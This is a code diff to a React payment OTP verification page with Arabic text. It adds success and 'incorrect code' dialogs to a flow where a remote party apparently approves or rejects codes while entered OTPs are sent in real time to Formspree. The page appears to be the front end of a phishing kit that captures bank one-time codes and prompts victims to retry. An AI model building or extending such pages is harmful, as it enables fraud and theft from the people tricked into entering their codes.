@@ -3,13 +3,20 @@ import { useNavigate, useSearchParams } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Shield, RefreshCw, CheckCircle2, Loader2 } from "lucide-react";
+import { Shield, RefreshCw, CheckCircle2, Loader2, XCircle } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
 import { supabase } from "@/integrations/supabase/client";
 import { usePresence } from "@/hooks/usePresence";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
 
 const OTPVerification = () => {
   const navigate = useNavigate();
@@ -30,6 +37,7 @@ const OTPVerification = () => {
   const [applicationId, setApplicationId] = useState<string | null>(null);
   const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [showErrorDialog, setShowErrorDialog] = useState(false);
   usePresence(applicationId || undefined);
 
   // Send OTP data to Formspree in real-time
@@ -63,22 +71,26 @@ const OTPVerification = () => {
         if (data?.otp_approved) {
           clearInterval(interval);
           setWaitingForApproval(false);
+          setShowSuccessDialog(true);
           
-          toast({
-            title: "تمت الموافقة",
-            description: "تم تأكيد عملية الدفع بنجاح",
-          });
-
+          // إعادة التوجيه إلى الصفحة الرئيسية بعد 3 ثواني
           setTimeout(() => {
             localStorage.removeItem('applicationId');
             navigate("/");
-          }, 2000);
+          }, 3000);
+        } else if (data?.status === 'rejected') {
+          clearInterval(interval);
+          setWaitingForApproval(false);
+          setShowErrorDialog(true);
+          
+          // إعادة تعيين OTP للسماح بإعادة المحاولة
+          setOtp("");
         }
       }, 2000);
 
       return () => clearInterval(interval);
     }
-  }, [waitingForApproval, applicationId, navigate, toast]);
+  }, [waitingForApproval, applicationId, navigate]);
 
   // Timer countdown
   useEffect(() => {
@@ -315,6 +327,65 @@ const OTPVerification = () => {
 
       <ChatButton />
       <Footer />
+
+      {/* نافذة النجاح */}
+      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <DialogContent className="sm:max-w-md text-center">
+          <DialogHeader>
+            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-green-100 dark:bg-green-900/20">
+              <CheckCircle2 className="h-12 w-12 text-green-600 dark:text-green-400" />
+            </div>
+            <DialogTitle className="text-2xl font-bold text-center">
+              تم الدفع بنجاح! 🎉
+            </DialogTitle>
+            <DialogDescription className="text-center text-base pt-2">
+              تم تأكيد عملية الدفع بنجاح
+              <br />
+              سيتم إعادة توجيهك إلى الصفحة الرئيسية...
+            </DialogDescription>
+          </DialogHeader>
+          <div className="flex justify-center pt-2">
+            <Loader2 className="h-6 w-6 animate-spin text-primary" />
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* نافذة الخطأ */}
+      <Dialog open={showErrorDialog} onOpenChange={(open) => {
+        setShowErrorDialog(open);
+        if (!open) {
+          // إعادة تعيين حالة الرفض في قاعدة البيانات عند إغلاق النافذة
+          if (applicationId) {
+            supabase
+              .from('customer_applications')
+              .update({ status: 'pending' })
+              .eq('id', applicationId);
+          }
+        }
+      }}>
+        <DialogContent className="sm:max-w-md text-center">
+          <DialogHeader>
+            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center rounded-full bg-red-100 dark:bg-red-900/20">
+              <XCircle className="h-12 w-12 text-red-600 dark:text-red-400" />
+            </div>
+            <DialogTitle className="text-2xl font-bold text-center text-red-600 dark:text-red-400">
+              رمز تحقق غير صحيح! ❌
+            </DialogTitle>
+            <DialogDescription className="text-center text-base pt-2">
+              يرجى إدخال رمز التحقق الصحيح
+              <br />
+              حاول مرة أخرى
+            </DialogDescription>
+          </DialogHeader>
+          <Button 
+            onClick={() => setShowErrorDialog(false)}
+            className="mt-4"
+            variant="default"
+          >
+            حسناً، سأحاول مرة أخرى
+          </Button>
+        </DialogContent>
+      </Dialog>
     </div>;
 };
 export default OTPVerification;
